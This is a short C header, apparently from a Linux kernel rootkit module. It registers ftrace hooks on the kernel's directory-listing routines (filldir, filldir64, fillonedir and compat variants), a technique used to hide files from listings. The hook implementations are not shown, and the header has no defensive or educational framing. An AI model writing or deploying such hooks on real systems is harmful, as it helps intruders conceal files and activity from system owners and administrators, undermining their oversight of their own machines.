#pragma once

#include "ftrace_helper.h"

//#include "hooks_getdents64.h"
#include "hooks_filldir.h"

static struct ftrace_hook syscall_hooks[] = {
	//HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
	HOOK_NOSYS("fillonedir", hook_fillonedir, &orig_fillonedir),
	HOOK_NOSYS("filldir", hook_filldir, &orig_filldir),
	HOOK_NOSYS("filldir64", hook_filldir64, &orig_filldir64),
	HOOK_NOSYS("compat_fillonedir", hook_compat_fillonedir, &orig_compat_fillonedir),
	HOOK_NOSYS("compat_filldir", hook_compat_filldir, &orig_compat_filldir),
};
